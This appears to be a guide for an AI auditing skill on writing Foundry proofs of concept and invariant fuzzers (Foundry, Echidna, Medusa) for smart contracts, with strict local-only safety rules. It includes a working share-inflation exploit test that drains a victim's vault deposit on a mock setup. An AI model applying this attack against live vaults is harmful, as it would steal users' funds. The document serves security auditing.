# PoCs and invariant fuzzing

Guidance behind SKILL.md steps 6 and 7. Load it when writing a fuzz harness or a proof-of-concept test.

## Safety rules (always)

- **Local execution only.** A PoC runs in Foundry's in-memory EVM: a fresh local deployment, or a fork read from an RPC (`vm.createSelectFork`, `--fork-url`). Forking reads chain state; it never sends a transaction.
- **Never** `--broadcast`, never `forge script` against a live RPC, never `cast send`, never a real private key or mnemonic. Use `makeAddr("attacker")`, `vm.deal`, and `deal` (forge-std `StdCheats`).
- **RPC URLs** come from the user or from `foundry.toml` `[rpc_endpoints]` referencing an environment variable. Never hardcode, print, or commit a URL that contains an API key.
- **Pin the fork block** (`vm.createSelectFork("mainnet", 19_000_000)`) so the PoC is reproducible and does not depend on today's state.
- **Do not modify the audited code.** PoCs and harnesses go in a scratch directory or `test/audit/` with a clear name, and are not committed unless the user asks.
- **Disclosure.** A PoC against a live, unpatched deployment is sensitive. Keep it out of public PR comments, issues, and gists; point the user to the protocol's private disclosure channel.

## Foundry PoC template

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Vault} from "src/Vault.sol";
import {MockERC20} from "test/mocks/MockERC20.sol";

/// @notice PoC for H-01: first depositor inflates share price and steals the next deposit.
contract PoC_H01_ShareInflation is Test {
    Vault vault;
    MockERC20 asset;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        asset = new MockERC20("USD", "USD", 18);
        vault = new Vault(asset);
        asset.mint(attacker, 10_001 ether);
        asset.mint(victim, 10_000 ether);
    }

    function test_H01_attackerStealsVictimDeposit() public {
        uint256 attackerStart = asset.balanceOf(attacker);

        // 1. Attacker deposits 1 wei and receives 1 share.
        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        // 2. Attacker donates directly, inflating the price of that one share.
        asset.transfer(address(vault), 10_000 ether);
        vm.stopPrank();

        // 3. Victim deposits; shares round down to 0.
        vm.startPrank(victim);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(10_000 ether, victim);
        vm.stopPrank();
        assertEq(vault.balanceOf(victim), 0, "victim received no shares");

        // 4. Attacker redeems the only share and takes both deposits.
        vm.prank(attacker);
        vault.redeem(1, attacker, attacker);

        uint256 profit = asset.balanceOf(attacker) - attackerStart;
        console2.log("attacker profit (wei):", profit);
        assertGt(profit, 9_999 ether);
    }
}
```

Run only the PoC:

```bash
forge test --match-contract PoC_H01 -vvvv
forge test --match-test test_H01 --fork-url "$MAINNET_RPC_URL" --fork-block-number 19000000 -vvvv
```

What makes a PoC convincing:

- Numbered comments mirror the exploit scenario in the report, step for step.
- Starts from a realistic state: real deployment parameters, a fork of the live protocol, or the project's own deployment fixture — not a contrived owner setup.
- The attacker never uses a privileged prank. If the exploit needs one, the finding is about that role, and the PoC says so.
- Asserts the damage (profit, frozen funds, broken invariant) with a number, and logs it.
- Real tokens on forks (USDT, USDC, stETH) where token behavior matters; mocks hide fee-on-transfer and missing-return behavior.

## Foundry invariant testing

Use a **handler** to restrict the fuzzer to meaningful call sequences, and **ghost variables** to track what the protocol should hold.

```solidity
contract VaultHandler is Test {
    Vault vault; MockERC20 asset;
    uint256 public ghostDeposited; uint256 public ghostWithdrawn;
    address[] public actors;

    constructor(Vault v, MockERC20 a) { vault = v; asset = a;
        for (uint256 i; i < 3; i++) actors.push(makeAddr(string(abi.encode(i)))); }

    function deposit(uint256 actorSeed, uint256 amount) external {
        address actor = actors[bound(actorSeed, 0, actors.length - 1)];
        amount = bound(amount, 1, 1e30);
        asset.mint(actor, amount);
        vm.startPrank(actor);
        asset.approve(address(vault), amount);
        vault.deposit(amount, actor);
        vm.stopPrank();
        ghostDeposited += amount;
    }

    function redeem(uint256 actorSeed, uint256 shares) external {
        address actor = actors[bound(actorSeed, 0, actors.length - 1)];
        shares = bound(shares, 0, vault.balanceOf(actor));
        if (shares == 0) return;
        vm.prank(actor);
        ghostWithdrawn += vault.redeem(shares, actor, actor);
    }
}

contract VaultInvariants is Test {
    Vault vault; MockERC20 asset; VaultHandler handler;

    function setUp() public {
        asset = new MockERC20("USD", "USD", 18);
        vault = new Vault(asset);
        handler = new VaultHandler(vault, asset);
        targetContract(address(handler));
    }

    function invariant_solvent() public view {
        assertGe(asset.balanceOf(address(vault)), vault.convertToAssets(vault.totalSupply()));
    }

    function invariant_noValueCreated() public view {
        assertLe(handler.ghostWithdrawn(), handler.ghostDeposited());
    }
}
```

```bash
forge test --match-contract VaultInvariants -vv
FOUNDRY_INVARIANT_RUNS=500 FOUNDRY_INVARIANT_DEPTH=100 forge test --match-contract VaultInvariants
```

Set `fail_on_revert = false` (default) while exploring, and `true` when every handler call is expected to succeed. Report the runs and depth used.

## Echidna and Medusa

Both are property-based fuzzers that call the target from several senders. Use them when installed and when the invariant needs long call sequences.

```solidity
contract VaultEchidna {
    Vault vault; MockERC20 asset;
    constructor() { asset = new MockERC20("USD", "USD", 18); vault = new Vault(asset); }

    function deposit(uint256 amount) public {
        amount = 1 + (amount % 1e30);
        asset.mint(address(this), amount);
        asset.approve(address(vault), amount);
        vault.deposit(amount, address(this));
    }

    // Echidna: functions prefixed echidna_ that return bool.
    function echidna_solvent() public view returns (bool) {
        return asset.balanceOf(address(vault)) >= vault.convertToAssets(vault.totalSupply());
    }
}
```

```bash
echidna test/audit/VaultEchidna.sol --contract VaultEchidna --test-limit 100000
echidna . --contract VaultEchidna --test-mode assertion       # assert()-based properties
medusa init                                                   # creates medusa.json; set target contracts
medusa fuzz --timeout 600
```

Medusa reads the same `property_`/`echidna_`-style boolean properties and assertion tests (configure prefixes in `medusa.json`). Agree the time budget with the user; record the test limit or timeout in the report.

## Invariants worth writing

| Protocol type | Invariant |
|---------------|-----------|
| Any token | `sum(balances) == totalSupply`; transfers conserve supply; no balance above supply |
| ERC-4626 vault | Assets held ≥ assets owed to all shares; `previewDeposit` ≤ actual shares minted; round-trip deposit→redeem never profits; share price never decreases without a loss event |
| Lending | Every position healthy after any non-liquidation action; total borrows ≤ total supplied plus reserves; liquidation always improves health; interest index monotonic |
| AMM | `k` non-decreasing after swaps (fees included); reserves match balances after `sync`; no swap returns more than the reserve |
| Staking / rewards | Total rewards paid ≤ rewards funded; a user's claimable never decreases without a claim; accrual independent of how actions are split |
| Governance | Voting power used ≤ snapshot power; a proposal executes at most once |
| Access control | Privileged state variables change only through privileged functions (assert the value after every handler call) |
| Upgradeable | State read through the proxy is unchanged after an upgrade to the next version |

A holding invariant is evidence, not proof: report the runs, depth, and the handlers' coverage of the state space.
